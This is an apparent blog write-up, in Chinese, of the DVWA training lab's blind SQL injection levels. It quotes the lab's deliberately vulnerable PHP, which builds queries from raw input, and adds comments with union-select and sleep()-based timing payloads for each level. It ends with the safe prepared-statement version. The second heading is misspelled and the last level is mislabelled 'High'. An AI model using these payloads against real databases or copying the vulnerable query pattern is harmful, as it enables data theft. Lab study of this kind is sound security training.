---
title: "DVWA SQL Injection blind 過關秘籍"
date: 2020-04-10
description: "通過分析 DVWA 四個難度級別下 SQL 盲注的源碼,講解利用 union 與 sleep 等技巧繞過無回顯注入的思路。"
tags: ["思考"]
author: sdttttt
draft: false
cover:
  image: "images/covers/20200410-DVWA-SQL-Injection-blind-過關秘籍-049.svg"
  alt: ""
  hidden: false
aliases: ["/posts/2020041006c1bb/"]
language: "zh-tw"
---

返回的結果集無法看到，只能通過一些頁面顯示或狀態來判斷。
像瞎子一樣。

###

### Low

```php
if(isset( $_GET[ 'Submit' ])) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    // 沒有一點點防備
    // 嘗試構造: (由於看不到結果集，所以脫褲子的語句是無效)
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,2 # ';
    // User ID exists in the database. <存在注入漏洞>
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,if(length( database())=4,sleep(4),2) # ';

    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    mysql_close();
}
```

###

### MIEDUM

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysql_real_escape_string( $id );

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    // 嘗試構造:
    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
    // 以上判斷存在注入漏洞
    // SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) > 4, sleep(3), 2)

    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}
```

###

### High

```php
if( isset( $_SESSION['id'])){
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    // 沒有新花樣，只限制輸出條目是無法攔住我們的
    // 嘗試構造:
    // SELECT first_name, last_name FROM users WHERE user_id = '0' union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i < $num ) {
        // Get values
        $first = mysql_result( $result, $i, "first_name" );
        $last  = mysql_result( $result, $i, "last_name" );

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";

        // Increase loop count
        $i++;
    }

    mysql_close();
}
```

###

### High

```php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        // PDO 無法注入
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();
```
